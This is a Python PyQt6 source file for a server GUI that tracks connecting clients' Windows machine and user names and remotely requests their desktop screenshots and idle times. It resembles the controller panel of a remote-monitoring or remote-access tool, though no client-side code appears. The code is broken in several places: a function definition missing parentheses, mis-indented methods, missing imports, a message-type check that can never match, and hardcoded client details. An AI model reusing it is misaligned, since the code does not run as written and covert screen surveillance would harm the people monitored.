import sys
import socket
import struct
from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout, QBoxLayout, QPushButton, QLabel
from PyQt6.QtWidgets import QSlider, QListWidget, QListWidgetItem, QMessageBox, QFileDialog, QGraphicsScene, QGraphicsView, QStackedWidget
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
import sqlite3
import base64
import zlib
import hashlib



class ClientConnection(QThread):
    connected = pyqtSignal(str, int, str, str)
    disconnected = pyqtSignal(str, int)
    messageReceived = pyqtSignal(str, str, int)
    screenshotReceived = pyqtSignal(bytes)

    def __init__(self, client_socket, client_address, client_windows_system_machine_name, client_windows_username, database, cursor):
        super().__init__()
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_windows_system_machine_name = client_windows_system_machine_name
        self.client_windows_username = client_windows_username
        self.database = database
        self.cursor = cursor
        self.running = True

    def run(self):
            while self.running:
                try:
                    data = self.client_socket.recv(1024)
                    if not data:
                        self.disconnected.emit(self.client_address[0], self.client_address[1])
                        break
                    msg_type = data[:4].decode()
                    if msg_type == "IDLE":
                        dwIdleTime = struct.unpack("I", data[4:8])[0]
                        self.messageReceived.emit(self.client_address[0], str(dwIdleTime), self.client_address[1])
                    elif msg_type == "SCREENSHOT":
                        start_index = data.find(b"SCREENSHOT_DATA_START:") + len("SCREENSHOTDATA_START:")
                        end_index = data.find(b"SCREENSHOT_DATA_END")
                        if start_index != -1 and end_index != -1:
                            screenshot_data = data[start_index:end_index]
                            self.screenshotReceived.emit(screenshot_data)
                except:
                    self.disconnected.emit(self.client_address[0], self.client_address[1])
                    break

            self.client_socket.close()
            self.client_socket = None
            self.client_address = None

            self.database.commit()

        def stop(self):
            self.running = False

class ClientConnectionWidget(QWidget):
    def __init__(self, client_address, client_socket, connection_thread, client_windows_system_machine_name, client_windows_username):
        super().__init__()
        self.client_address = client_address
        self.client_socket = client_socket
        self.connection_thread = connection_thread
        self.client_windows_system_machine_name = client_windows_system_machine_name
        self.client_windows_username = client_windows_username
        self.initUI()

    def initUI(self):
        self.client_info_label = QLabel(f"{self.client_address[0]}:{self.client_address[1]} - {self.client_windows_system_machine_name} - {self.client_windows_username}")
        self.buttonA = QPushButton("Terminate")
        self.buttonB = QPushButton("Request Screenshot")
        self.buttonC = QPushButton("Show Screenshot")
        self.buttonC.setEnabled(False)

        self.buttonA.clicked.connect(self.terminateConnection)
        self.buttonB.clicked.connect(self.requestScreenshot)
        self.buttonC.clicked.connect(self.showScreenshot)

        layout = QHBoxLayout()
        layout.addWidget(self.client_info_label)
        layout.addWidget(self.buttonA)
        layout.addWidget(self.buttonB)
        layout.addWidget(self.buttonC)

        self.setLayout(layout)

        self.connection_thread.messageReceived.connect(self.handleMessage)
        self.connection_thread.screenshotReceived.connect(self.handleScreenshot)

    def terminateConnection(self):
        self.connection_thread.stop()
        self.client_socket.close()
        self.deleteLater()

    def requestScreenshot(self):
        self.buttonC.setEnabled(True)
        self.client_socket.sendall(b"REQUESTING DESKTOP SCREENSHOT")

    def showScreenshot(self):
        screenshot_popup_widget = ScreenshotPopupWidget(self.screenshotReceived)
        screenshot_popup_widget.show()

    screenshotReceived = pyqtSignal(bytes)

    def handleMessage(self, client_ip, message, client_port):
        QMessageBox.information(self, "Message Received", f"Client {client_ip}:{client_port} sent: {message}")

    def handleScreenshot(self, screenshot_data):
        self.buttonC.setEnabled(True)
        self.screenshotReceived.emit(screenshot_data)

class ScreenshotPopupWidget(QWidget):
    def __init__(self, screenshot_data):
        super().__init__()
        self.screenshot_data = screenshot_data
        self.initUI()

    def initUI(self):
        scene = QGraphicsScene(self)
        image = QImage.fromData(self.screenshot_data, "RGB")
        pixmap = QPixmap.fromImage(image)
        item = QGraphicsPixmapItem(pixmap)
        scene.addItem(item)

        view = QGraphicsView(scene)
        view.setRenderHint(QPainter.Antialiasing)
        view.setViewportUpdateMode(QGraphicsView.BoundingRectViewportUpdate)
        view.setOptimizationFlags(QGraphicsView.DontAdjustForAntialiasing | QGraphicsView.DontSavePainterState)

        layout = QVBoxLayout()
        layout.addWidget(view)

        self.setLayout(layout)

class ServerGUI(QWidget):
    def __init__(self):
        super().__init__()
        print("super inited")
        self.initUI()
        print("ServerGUI init called.")

    def initUI(self):
        self.clients_panel = QStackedWidget()
        print("clients_panel object created.")
        self.clients_panel.setGeometry(0, 0, 1024, 768)
        print("clients_panel size set.")
        self.connected_clients_label = QLabel("CONNECTED CLIENTS:")
        self.clients_panel.addWidget(self.connected_clients_label)
        print("connected_clients_label added to clients_panel.")


        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(("127.0.0.1", 13337))
        self.server_socket.listen(5)
        print("server_socket created and listening.")

        self.client_sockets = []
        self.client_addresses = []
        self.connection_threads = []

        self.database = sqlite3.connect("server.db")
        self.cursor = self.database.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY,
                client_windows_system_machine_name TEXT,
                client_windows_username TEXT,
                last_connection_ip TEXT,
                last_connection_port INTEGER,
                last_connected_time TEXT
            )
        """)
        self.database.commit()
        print("db initialized.")
        
        self.client_list = QListWidget()
        self.client_list.itemClicked.connect(self.showClientDetails)
        print("client_list widget created and signal-slot is connected.")

        layout = QVBoxLayout()
        layout.addWidget(self.clients_panel)
        layout.addWidget(self.client_list)
        print("2 widgets are added to layout (main layout.)")

        self.setLayout(layout)
        print("main layout is set.")

        self.server_thread = QThread()
        print("server_thread created.")
        self.server_thread.started.connect(self.handleClients)
        self.server_thread.start()
        print("server_thread started.")

    def handleClients(self):
        def client_handler:
            client_socket, client_address = self.server_socket.accept()
            client_windows_system_machine_name, client_windows_username = self.get_client_info(client_socket)

            self.client_sockets.append(client_socket)
            self.client_addresses.append(client_address)

            connection_thread = ClientConnection(client_socket, client_address, client_windows_system_machine_name, client_windows_username, self.database, self.cursor)
            connection_thread.connected.connect(self.addClientConnectionWidget)
            connection_thread.disconnected.connect(self.removeClientConnectionWidget)
            connection_thread.messageReceived.connect(self.handleMessage)
            connection_thread.screenshotReceived.connect(self.handleScreenshot)
            connection_thread.start()

            return connection_thread

        self.client_handler_thread = QThread()
        self.client_handler = client_handler
        self.client_handler_thread.started.connect(self.client_handler)
        self.client_handler_thread.start()

    def addClientConnectionWidget(self, client_ip, client_port, client_windows_system_machine_name, client_windows_username):
        client_id = self.get_client_id((client_windows_system_machine_name, client_windows_username))
        if client_id is None:
            client_id = self.add_client((client_windows_system_machine_name, client_windows_username), client_ip, client_port)
        self.update_client(client_id, client_ip, client_port)

        client_connection_widget = ClientConnectionWidget((client_ip, client_port), self.client_sockets[-1], self.connection_threads[-1], client_windows_system_machine_name, client_windows_username)
        self.clients_panel.addWidget(client_connection_widget)
        self.clients_panel.setCurrentWidget(client_connection_widget)

    def removeClientConnectionWidget(self, client_ip, client_port):
        for i, client_connection_widget in enumerate(self.clients_panel.children()):
            if client_connection_widget.client_address == (client_ip, client_port):
                client_id = self.get_client_id((client_ip, client_port))
                if client_id is not None:
                    self.update_client(client_id, None, None)
                self.clients_panel.removeWidget(client_connection_widget)
                break

    def handleMessage(self, client_ip, message, client_port):
        QMessageBox.information(self, "Message Received", f"Client {client_ip}:{client_port} sent: {message}")

    def handleScreenshot(self, screenshot_data):
        for i, client_connection_widget in enumerate(self.clients_panel.children()):
            if client_connection_widget.screenshotReceived:
                client_connection_widget.screenshotReceived.emit(screenshot_data)
                break

    def get_client_info(self, client_socket):
        return "THINKPAD-x230-OxpaHHUk-CEMEH", "CEMEH-ZORKIY-GLA3"

    def get_client_id(self, client_info):
        self.cursor.execute("SELECT id FROM clients WHERE client_windows_system_machine_name=? AND client_windows_username=?", client_info)
        result = self.cursor.fetchone()
        if result is not None:
            return result[0]
        return None

    def add_client(self, client_info, last_connection_ip, last_connection_port):
        self.cursor.execute("""
            INSERT INTO clients (client_windows_system_machine_name, client_windows_username, last_connection_ip, last_connection_port, last_connected_time)
            VALUES (?, ?, ?, ?, datetime('now'))
        """, client_info + (last_connection_ip, last_connection_port))
        self.database.commit()
        self.cursor.execute("SELECT last_insert_rowid()")
        client_id = self.cursor.fetchone()[0]
        return client_id

    def update_client(self, client_id, last_connection_ip, last_connection_port):
        if client_id is not None:
            self.cursor.execute("""
                UPDATE clients SET last_connection_ip=?, last_connection_port=?, last_connected_time=datetime('now') WHERE id=?
            """, (last_connection_ip, last_connection_port, client_id))
            self.database.commit()

    def showClientDetails(self, item):
        client_id = int(item.text().split()[-1])
        client_info = self.cursor.execute("SELECT client_windows_system_machine_name, client_windows_username FROM clients WHERE id=?", (client_id,)).fetchone()
        QMessageBox.information(self, "Client Details", f"Client: {client_info[0]} ({client_info[1]})")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    print("Initializing app")
    server_gui = ServerGUI()
    print("Created server_gui")
    server_gui.show()
    sys.exit(app.exec())